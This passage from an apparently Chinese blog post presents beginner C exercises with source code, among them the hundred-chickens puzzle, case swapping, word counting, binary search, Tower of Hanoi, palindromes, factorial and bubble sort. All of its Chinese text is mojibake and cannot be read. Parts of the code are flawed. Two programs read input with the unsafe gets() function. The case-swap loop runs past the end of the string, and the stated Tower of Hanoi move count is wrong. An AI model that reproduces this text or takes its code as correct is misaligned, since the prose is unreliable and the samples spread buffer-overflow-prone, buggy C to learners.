class="keyword">if</span>(perfect_number(number)==<span class="number">1</span>) </span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>,number);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>è¿è¡Œç»“æœï¼š  </p>
<p><img src="/2019/08/12/OLD/02.jpg"></p>
<h2 id="ç™¾é’±ä¹°é¸¡"><a href="#ç™¾é’±ä¹°é¸¡" class="headerlink" title="ç™¾é’±ä¹°é¸¡"></a>ç™¾é’±ä¹°é¸¡</h2><p>æˆ‘å›½å¤ä»£æ•°å­¦å®¶å¼ ä¸˜å»ºåœ¨ä»–çš„ã€Šç®—ç»ã€‹ä¸­æå‡ºäº†ä¸€ä¸ªè‘—åçš„â€œç™¾é’±ä¹°ç™¾é¸¡é—®é¢˜â€ï¼š  </p>
<p>é¸¡ç¿ä¸€ï¼Œå€¼é’±äº”ï¼Œé¸¡æ¯ä¸€ï¼Œå€¼é’±ä¸‰ï¼Œé¸¡é›ä¸‰ï¼Œå€¼é’±ä¸€ï¼Œç™¾é’±ä¹°ç™¾é¸¡ï¼Œé—®ç¿ã€æ¯ã€é›å„å‡ ä½•ï¼Ÿ</p>
<p>å…¬é¸¡ä¸€åªäº”å…ƒï¼Œæ¯é¸¡ä¸€åªä¸‰å…ƒï¼Œå°é¸¡å´½å´½ä¸‰åªä¸€å…ƒã€‚</p>
<p>æºä»£ç ï¼š  </p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&quot;stdio.h&quot;</span> </span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> cock,hen,chick;</span><br><span class="line">	<span class="keyword">for</span>(cock=<span class="number">0</span>;cock&lt;=<span class="number">20</span>;cock++)<span class="comment">//100å…ƒå…¨ä¹°å…¬é¸¡å¯ä»¥ä¹°20åªï¼Œä¹Ÿå¯ä»¥ä¸ä¹° </span></span><br><span class="line">		<span class="keyword">for</span>(hen=<span class="number">0</span>;hen&lt;=<span class="number">33</span>;hen++)<span class="comment">//100å…ƒå…¨ä¹°æ¯é¸¡å¯ä»¥ä¹°33åªï¼Œä¹Ÿå¯ä»¥ä¸ä¹° </span></span><br><span class="line">			<span class="keyword">for</span>(chick=<span class="number">3</span>;chick&lt;=<span class="number">99</span>;chick++)<span class="comment">//100å…ƒå…¨ä¹°å°é¸¡æœ€å¤š99åªï¼Œä¸”æ˜¯3çš„å€æ•° </span></span><br><span class="line">				<span class="keyword">if</span>(cock*<span class="number">5</span>+hen*<span class="number">3</span>+chick/<span class="number">3</span>==<span class="number">100</span>)<span class="comment">//æ˜¯å¦èŠ±äº†100å…ƒ </span></span><br><span class="line">					<span class="keyword">if</span>(cock+hen+chick==<span class="number">100</span>)<span class="comment">//æ˜¯å¦æ€»å…±æœ‰100åª </span></span><br><span class="line">						<span class="keyword">if</span>(chick%<span class="number">3</span>==<span class="number">0</span>)<span class="comment">//ä¹°å°é¸¡çš„æ•°é‡æ˜¯å¦æ˜¯3çš„å€æ•° </span></span><br><span class="line">							<span class="built_in">printf</span>(<span class="string">&quot;cock:%d hen:%d chick:%d\n&quot;</span>,cock,hen,chick);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>è¿è¡Œç»“æœï¼š  </p>
<p><img src="/2019/08/12/OLD/bai.jpg"></p>
<h2 id="å¤§å°å†™äº’æ¢"><a href="#å¤§å°å†™äº’æ¢" class="headerlink" title="å¤§å°å†™äº’æ¢"></a>å¤§å°å†™äº’æ¢</h2><p>æºä»£ç ï¼š  </p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&quot;stdio.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> N 100</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> i;</span><br><span class="line">	<span class="keyword">char</span> ch[N];</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;è¯·è¾“å…¥ä¸€ä¸²å­—ç¬¦ï¼š\n&quot;</span>);</span><br><span class="line">	gets(ch);</span><br><span class="line">	<span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;N;i++)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">if</span>(ch[i]&gt;=<span class="string">&#x27;a&#x27;</span>&amp;&amp;ch[i]&lt;=<span class="string">&#x27;z&#x27;</span>)</span><br><span class="line">				ch[i]-=<span class="number">32</span>;</span><br><span class="line">			<span class="keyword">else</span> <span class="keyword">if</span>(ch[i]&gt;=<span class="string">&#x27;A&#x27;</span>&amp;&amp;ch[i]&lt;=<span class="string">&#x27;Z&#x27;</span>)</span><br><span class="line">					ch[i]+=<span class="number">32</span>; </span><br><span class="line">		&#125;</span><br><span class="line">	<span class="built_in">puts</span>(ch);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>è¿è¡Œç»“æœï¼š  </p>
<p><img src="/2019/08/12/OLD/dx.jpg"></p>
<h2 id="å•è¯ä¸ªæ•°"><a href="#å•è¯ä¸ªæ•°" class="headerlink" title="å•è¯ä¸ªæ•°"></a>å•è¯ä¸ªæ•°</h2><p>ç¼–å†™ä¸€ä¸ªç¨‹åºè®°å½•è¿™è¡Œä¸€å…±æœ‰å¤šå°‘ä¸ªå•è¯ï¼  </p>
<p>æºä»£ç ï¼š  </p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&quot;stdio.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> N 100</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">char</span> ch[N];</span><br><span class="line">	<span class="keyword">int</span> i,sum=<span class="number">0</span>;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;è¯·è¾“å…¥ä¸€å¥è¯ï¼š\n&quot;</span>);</span><br><span class="line">	gets(ch);</span><br><span class="line">	<span class="keyword">for</span>(i=<span class="number">0</span>;ch[i]!=<span class="string">&#x27;\0&#x27;</span>;i++)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">if</span>(ch[i]!=<span class="string">&#x27; &#x27;</span>&amp;&amp;(ch[i+<span class="number">1</span>]==<span class="string">&#x27; &#x27;</span>||ch[i+<span class="number">1</span>]==<span class="string">&#x27;\0&#x27;</span>))</span><br><span class="line">				&#123;</span><br><span class="line">					sum++;</span><br><span class="line">				&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;ä¸€å…±æœ‰ %d ä¸ªå•è¯ï¼\n&quot;</span>,sum);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>è¿è¡Œç»“æœï¼š  </p>
<p><img src="/2019/08/12/OLD/1.jpg"></p>
<h2 id="äºŒåˆ†æŸ¥æ‰¾"><a href="#äºŒåˆ†æŸ¥æ‰¾" class="headerlink" title="äºŒåˆ†æŸ¥æ‰¾"></a>äºŒåˆ†æŸ¥æ‰¾</h2><p>è¾“å…¥ä¸€ä¸ªæ•°ï¼Œç¡®å®šå®ƒåœ¨æ•°ç»„ä¸­çš„ä½ç½®ï¼Œå¦‚æœæ²¡æœ‰è¿™ä¸ªæ•°è¾“å‡º-1ï¼Œå¦åˆ™è¾“å‡ºå®ƒçš„ä¸‹æ ‡ï¼</p>
<p>æºä»£ç ï¼š  </p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> N 5</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> a[N],i,j,t,h,e,m,n;</span><br><span class="line">	m=h=<span class="number">0</span>;</span><br><span class="line">	e=N<span class="number">-1</span>;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;è¯·è¾“å…¥%dä¸ªæ•´æ•°ï¼š\n&quot;</span>,N);</span><br><span class="line">	<span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;N;i++)</span><br><span class="line">		<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;a[i]);</span><br><span class="line">	<span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;N<span class="number">-1</span>;i++)</span><br><span class="line">		<span class="keyword">for</span>(j=N<span class="number">-1</span>;j&gt;i;j--)</span><br><span class="line">			<span class="keyword">if</span>(a[j]&gt;a[j<span class="number">-1</span>])</span><br><span class="line">				t=a[j],a[j]=a[j<span class="number">-1</span>],a[j<span class="number">-1</span>]=t;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;æ­¤æ•°ç»„ï¼š&quot;</span>);</span><br><span class="line">	<span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;N;i++)</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>,a[i]);</span><br><span class="line">	<span class="built_in">putchar</span>(<span class="string">&#x27;\n&#x27;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;è¯·è¾“å…¥æ‚¨è¦æŸ¥æ‰¾çš„æ•°ï¼š\n&quot;</span>);</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;n);</span><br><span class="line">	<span class="keyword">while</span>(h&lt;=e)</span><br><span class="line">	&#123;</span><br><span class="line">		m=(h+e)/<span class="number">2</span>;</span><br><span class="line">		<span class="keyword">if</span>(a[m]==n)</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">else</span> <span class="keyword">if</span>(n&gt;a[m])</span><br><span class="line">				e=m<span class="number">-1</span>;</span><br><span class="line">			 <span class="keyword">else</span> </span><br><span class="line">			 	h=m+<span class="number">1</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>(h&lt;=e)</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;%dçš„ä¸‹æ ‡ä¸º%d\n&quot;</span>,n,m);</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;-1\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>è¿è¡Œç»“æœï¼š  </p>
<p><img src="/2019/08/12/OLD/2f.jpg"></p>
<h2 id="æ±‰æ´›å¡”"><a href="#æ±‰æ´›å¡”" class="headerlink" title="æ±‰æ´›å¡”"></a>æ±‰æ´›å¡”</h2><p><strong>æ±‰è¯ºå¡”</strong>ï¼ˆåˆç§°æ²³å†…å¡”ï¼‰é—®é¢˜æ˜¯æºäºå°åº¦ä¸€ä¸ªå¤è€ä¼ è¯´çš„ç›Šæ™ºç©å…·ã€‚å¤§æ¢µå¤©åˆ›é€ ä¸–ç•Œçš„æ—¶å€™åšäº†ä¸‰æ ¹é‡‘åˆšçŸ³æŸ±å­ï¼Œåœ¨ä¸€æ ¹æŸ±å­ä¸Šä»ä¸‹å¾€ä¸ŠæŒ‰ç…§å¤§å°é¡ºåºæ‘ç€64ç‰‡é»„é‡‘åœ†ç›˜ã€‚å¤§æ¢µå¤©å‘½ä»¤å©†ç½—é—¨æŠŠåœ†ç›˜ä»ä¸‹é¢å¼€å§‹æŒ‰å¤§å°é¡ºåºé‡æ–°æ‘†æ”¾åœ¨å¦ä¸€æ ¹æŸ±å­ä¸Šã€‚å¹¶ä¸”è§„å®šï¼Œåœ¨å°åœ†ç›˜ä¸Šä¸èƒ½æ”¾å¤§åœ†ç›˜ï¼Œåœ¨ä¸‰æ ¹æŸ±å­ä¹‹é—´ä¸€æ¬¡åªèƒ½ç§»åŠ¨ä¸€ä¸ªåœ†ç›˜ã€‚  </p>
<p>å‡å¦‚æ¯ç§’é’Ÿä¸€æ¬¡ï¼Œå…±éœ€å¤šé•¿æ—¶é—´å‘¢ï¼Ÿä¸€ä¸ªå¹³å¹´365å¤©æœ‰31536000 ç§’ï¼Œé—°å¹´366å¤©æœ‰31622400ç§’ï¼Œå¹³å‡æ¯å¹´31556952ç§’ï¼Œè®¡ç®—ä¸€ä¸‹ï¼š  </p>
<p>18446744073709511615ç§’  </p>
<p>è¿™è¡¨æ˜ç§»å®Œè¿™äº›é‡‘ç‰‡éœ€è¦5845.54äº¿å¹´ä»¥ä¸Šï¼Œè€Œåœ°çƒå­˜åœ¨è‡³ä»Šä¸è¿‡45äº¿å¹´ï¼Œå¤ªé˜³ç³»çš„é¢„æœŸå¯¿å‘½æ®è¯´ä¹Ÿå°±æ˜¯æ•°ç™¾äº¿å¹´ã€‚çœŸçš„è¿‡äº†<strong>5845.54äº¿å¹´</strong>ï¼Œä¸è¯´å¤ªé˜³ç³»å’Œé“¶æ²³ç³»ï¼Œè‡³å°‘åœ°çƒä¸Šçš„ä¸€åˆ‡ç”Ÿå‘½ï¼Œè¿åŒæ¢µå¡”ã€åº™å®‡ç­‰ï¼Œéƒ½æ—©å·²ç»ç°é£çƒŸç­ã€‚  </p>
<h2 id="åˆ†æï¼š"><a href="#åˆ†æï¼š" class="headerlink" title="åˆ†æï¼š"></a>åˆ†æï¼š</h2><p>â‘ ï¼š         å¦‚æœåªæœ‰ 1 ä¸ª åˆ™ ç›´æ¥ä» A æŸ± ç§»åŠ¨åˆ° C æŸ±  </p>
<p>â‘¡ï¼š&gt;1:   </p>
<p>1:             å°† n-1 ä¸ªç›˜å­ï¼Œä»  A  å€ŸåŠ©  C  ç§»åŠ¨åˆ°ï¼š  B  </p>
<p>2:             å°† A ä¸Šå‰©ä¸‹çš„ 1 ä¸ª ç›˜å­ç§»åŠ¨åˆ° C   </p>
<p>3:             å°† n-1 ä¸ªç›˜å­, ä» B   å€ŸåŠ©  A  ç§»åŠ¨åˆ°ï¼š  C     </p>
<p>æºä»£ç ï¼š   </p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&quot;stdio.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> s=<span class="number">0</span>,i=<span class="number">1</span>;	<span class="comment">//å…¨å±€å˜é‡ </span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">h</span><span class="params">(<span class="keyword">int</span> n,<span class="keyword">char</span> a,<span class="keyword">char</span> b,<span class="keyword">char</span> c)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(n==<span class="number">1</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;%5d : %c------&gt;%c\n&quot;</span>,i++,a,c);		<span class="comment">//  ä¸€ä¸ªç›˜å­ ç›´æ¥ ä» A ----&gt; C </span></span><br><span class="line">			s++;</span><br><span class="line">		&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">		&#123;</span><br><span class="line">			h(n<span class="number">-1</span>,a,c,b);								<span class="comment">// å°† n-1 ä¸ªç›˜å­ï¼Œä»  A  å€ŸåŠ©  C  ç§»åŠ¨åˆ°ï¼š  B </span></span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;%5d : %c------&gt;%c\n&quot;</span>,i++,a,c);		<span class="comment">// å°† A ä¸Šå‰©ä¸‹çš„ 1 ä¸ª ç›˜å­ç§»åŠ¨åˆ° C </span></span><br><span class="line">			h(n<span class="number">-1</span>,b,a,c);        						<span class="comment">// å°† n-1 ä¸ªç›˜å­, ä» B   å€ŸåŠ©  A  ç§»åŠ¨åˆ°ï¼š  C </span></span><br><span class="line">			s++;</span><br><span class="line">		&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> n;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;è¯·è¾“å…¥æœ‰å‡ ä¸ªç›˜å­ï¼š&quot;</span>);</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;n);</span><br><span class="line">	</span><br><span class="line">	h(n,<span class="string">&#x27;A&#x27;</span>,<span class="string">&#x27;B&#x27;</span>,<span class="string">&#x27;C&#x27;</span>);</span><br><span class="line">	</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%dä¸ªç›˜å­ä¾›éœ€ç§»åŠ¨ï¼š%dæ¬¡ï¼\n&quot;</span>,n,s);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>è¿è¡Œç»“æœ:    </p>
<p><img src="/2019/08/12/OLD/hlt.jpg"></p>
<h2 id="çŒ´å­åƒæ¡ƒ"><a href="#çŒ´å­åƒæ¡ƒ" class="headerlink" title="çŒ´å­åƒæ¡ƒ"></a>çŒ´å­åƒæ¡ƒ</h2><p>çŒ´å­ç¬¬ä¸€å¤©æ‘˜ä¸‹è‹¥å¹²ä¸ªæ¡ƒå­ï¼Œå½“å³åƒäº†ä¸€åŠï¼Œè¿˜ä¸è¿‡ç˜¾ï¼Œåˆå¤šåƒäº†ä¸€ä¸ªã€‚ç¬¬äºŒå¤©æ—©ä¸Šåˆå°†ç¬¬ä¸€å¤©å‰©ä¸‹çš„æ¡ƒå­åƒæ‰ä¸€åŠï¼Œæœ‰å¤šåƒäº†ä¸€ä¸ªã€‚ä»¥åæ¯å¤©æ—©ä¸Šéƒ½åƒäº†å‰ä¸€å¤©å‰©ä¸‹çš„ä¸€åŠé›¶ä¸€ä¸ªã€‚åˆ°ç¬¬ 10 å¤©æ—©ä¸Šæƒ³å†åƒæ—¶ï¼Œå‘ç°åªå‰©ä¸‹ä¸€ä¸ªæ¡ƒå­äº†ã€‚æ±‚ä¸€å…±æœ‰å¤šå°‘ä¸ªæ¡ƒ!</p>
<p>æºä»£ç ï¼š  </p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*çŒ´å­ç¬¬ä¸€å¤©æ‘˜ä¸‹è‹¥å¹²ä¸ªæ¡ƒå­ï¼Œå½“å³åƒäº†ä¸€åŠï¼Œè¿˜ä¸è¿‡ç˜¾ï¼Œåˆå¤šåƒäº†ä¸€ä¸ªã€‚</span></span><br><span class="line"><span class="comment">ç¬¬äºŒå¤©æ—©ä¸Šåˆå°†ç¬¬ä¸€å¤©å‰©ä¸‹çš„æ¡ƒå­åƒæ‰ä¸€åŠï¼Œæœ‰å¤šåƒäº†ä¸€ä¸ªã€‚</span></span><br><span class="line"><span class="comment">ä»¥åæ¯å¤©æ—©ä¸Šéƒ½åƒäº†å‰ä¸€å¤©å‰©ä¸‹çš„ä¸€åŠé›¶ä¸€ä¸ªã€‚</span></span><br><span class="line"><span class="comment">åˆ°ç¬¬ 10 å¤©æ—©ä¸Šæƒ³å†åƒæ—¶ï¼Œå‘ç°åªå‰©ä¸‹ä¸€ä¸ªæ¡ƒå­äº†ã€‚ç¼–</span></span><br><span class="line"><span class="comment">å†™ç¨‹åºæ±‚çŒ´å­ç¬¬ä¸€å¤©æ‘˜äº†å¤šå°‘ä¸ªæ¡ƒå­*/</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&quot;stdio.h&quot;</span> </span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> day,peach_before,peach_after=<span class="number">1</span>;</span><br><span class="line">	<span class="keyword">for</span>(day=<span class="number">10</span>;day&gt;<span class="number">1</span>;day--)	<span class="comment">// ç»¼ä¸Šæ‰€è¿° æœ€åä¸€å¤©è¿˜å‰©ä¸€ä¸ªæ¡ƒï¼Œæ•…ï¼šä»åå¾€å‰æ¨ </span></span><br><span class="line">		&#123;</span><br><span class="line">			peach_before=(peach_after+<span class="number">1</span>)*<span class="number">2</span>;	<span class="comment">// å‰ä¸€å¤©çš„æ¡ƒå­æ€»æ•° == ï¼ˆåä¸€å¤©çš„æ¡ƒå­æ€»æ•° + 1 ï¼‰ * 2 </span></span><br><span class="line">			peach_after = peach_before;		<span class="comment">// ä¹‹åçš„ä¸€å¤©çš„æ•°é‡ == åˆšåˆšå¾—åˆ°çš„ç»“æœ </span></span><br><span class="line">		&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;æ€»å…±æœ‰ %d ä¸ªæ¡ƒï¼\n&quot;</span>,peach_before);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>è¿è¡Œç»“æœï¼š</p>
<p><img src="/2019/08/12/OLD/tz.jpg"></p>
<h2 id="å›æ–‡æ•°"><a href="#å›æ–‡æ•°" class="headerlink" title="å›æ–‡æ•°"></a>å›æ–‡æ•°</h2><p>â€œå›æ–‡â€æ˜¯æŒ‡æ­£è¯»åè¯»éƒ½èƒ½è¯»é€šçš„å¥å­ï¼Œå®ƒæ˜¯å¤ä»Šä¸­å¤–éƒ½æœ‰çš„ä¸€ç§ä¿®è¾æ–¹å¼å’Œæ–‡å­—æ¸¸æˆï¼Œå¦‚â€œæˆ‘ä¸ºäººäººï¼Œäººäººä¸ºæˆ‘â€ç­‰ã€‚åœ¨æ•°å­¦ä¸­ä¹Ÿæœ‰è¿™æ ·ä¸€ç±»æ•°å­—æœ‰è¿™æ ·çš„ç‰¹å¾ï¼Œæˆä¸ºå›æ–‡æ•°ï¼ˆpalindrome number</p>
<p>è®¾næ˜¯ä¸€ä»»æ„è‡ªç„¶æ•°ã€‚è‹¥å°†nçš„å„ä½æ•°å­—åå‘æ’åˆ—æ‰€å¾—è‡ªç„¶æ•°n1ä¸nç›¸ç­‰ï¼Œåˆ™ç§°nä¸ºä¸€å›æ–‡æ•°ã€‚ä¾‹å¦‚ï¼Œè‹¥n=1234321ï¼Œåˆ™ç§°nä¸ºä¸€å›æ–‡æ•°ï¼›ä½†è‹¥n=1234567ï¼Œåˆ™nä¸æ˜¯å›æ–‡æ•°ã€‚  </p>
<p>ç®€å•æ¥è¯´ï¼š æ­£è¯»ä¸åè¯»éƒ½ä¸€æ ·ï¼  </p>
<p>æºä»£ç ï¼š  </p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&quot;stdio.h&quot;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">h_h</span><span class="params">(<span class="keyword">int</span> x)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> i,j,m;</span><br><span class="line">	<span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;x;i++)</span><br><span class="line">		&#123;</span><br><span class="line">			j=i;</span><br><span class="line">			m=<span class="number">0</span>;</span><br><span class="line">			<span class="keyword">while</span>(j)</span><br><span class="line">				&#123;</span><br><span class="line">					m=m*<span class="number">10</span>+j%<span class="number">10</span>;</span><br><span class="line">					j/=<span class="number">10</span>;</span><br><span class="line">				&#125;</span><br><span class="line">			<span class="keyword">if</span>(i==m)</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>,i);</span><br><span class="line">			&#125;</span><br><span class="line">	<span class="keyword">return</span> i;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> x,y,i;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;è¯·è¾“å…¥ä¸€ä¸ªèŒƒå›´ å¦‚ï¼š100\n&quot;</span>);</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;x);</span><br><span class="line">	<span class="keyword">if</span>(h_h(x));</span><br><span class="line">		</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>è¿è¡Œç»“æœï¼š  </p>
<p><img src="/2019/08/12/OLD/6.png"></p>
<h2 id="é˜¶ä¹˜"><a href="#é˜¶ä¹˜" class="headerlink" title="é˜¶ä¹˜"></a>é˜¶ä¹˜</h2><p>æ¯”å¦‚ 5ï¼=5X4X3X2X1  =120</p>
<p>6! =6X5X4X3X2X1  =720</p>
<p>æºä»£ç ï¼š  </p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&quot;stdio.h&quot;</span> </span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> a,i;</span><br><span class="line">	<span class="keyword">double</span> sum=<span class="number">1</span>;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;è¯·è¾“å…¥ä¸€ä¸ªæ•°ï¼š\n&quot;</span>);</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;a);</span><br><span class="line">	<span class="keyword">for</span>(i=<span class="number">1</span>;i&lt;=a;i++)</span><br><span class="line">		&#123;</span><br><span class="line">			sum*=i;</span><br><span class="line">		&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%d!=%f\n&quot;</span>,a,sum);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>è¿è¡Œç»“æœï¼š</p>
<p><img src="/2019/08/12/OLD/j.jpg"></p>
<h2 id="å†’æ³¡æ³•æ’åº"><a href="#å†’æ³¡æ³•æ’åº" class="headerlink" title="å†’æ³¡æ³•æ’åº"></a>å†’æ³¡æ³•æ’åº</h2><p>å†’æ³¡æ³•æ’åºï¼š  </p>
<p>æºä»£ç ï¼š  </p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&quot;stdio.h&quot;</span> </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> N 5</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> a[N],i,j,t;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;è¯·è¾“å…¥%dä¸ªæ•°ï¼š\n&quot;</span>,N);</span><br><span class="line">	<span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;N;i++)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;a[i]);</span><br><span class="line">		&#125;</span><br><span class="line">	<span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;N<span class="number">-1</span>;i++)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">for</span>(j=N<span class="number">-1</span>;j&gt;i;j--)</span><br><span class="line">				&#123;</span><br><span class="line">					<span class="keyword">if</span>(a[j]&gt;a[j<span class="number">-1</span>])          <span class="comment">// &gt; ä¸ºé™åºï¼Œ&lt; ä¸ºå‡åº</span></span><br><span class="line">						&#123;</span><br><span class="line">							t=a[j],a[j]=a[j<span class="number">-1</span>],a[j<span class="number">-1</span>]=t;</span><br><span class="line">						&#125;</span><br><span class="line">				&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;å†’æ³¡æ³•æ’åº é™åºï¼š\n&quot;</span>);</span><br><span class="line">	<span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;N;i++)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>,a[i]);</span><br><span class="line">		&#125;</span><br><span class="line">			</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>è¿è¡Œç»“æœï¼š  </p>
<p><img src="/2019/08/12/OLD/7.png"></p>
<h2 id="x-2-0-amp-amp-x-3-0"><a href="#x-2-0-amp-amp-x-3-0" class="headerlink" title="x%2==0&amp;&amp;x%3==0"></a>x%2==0&amp;&amp;x%3==0</h2><p>è¾“å…¥ä¸€äº›æ­£æ•´æ•°ï¼ˆä»¥0è¡¨ç¤ºç»“æŸï¼‰ï¼Œç»Ÿè®¡å¹¶è¾“å‡ºèƒ½è¢«3æ•´é™¤çš„å¶æ•°çš„æ•°åŠä¸ªæ•°ï¼  </p>
<p>æºä»£ç ï¼š </p>
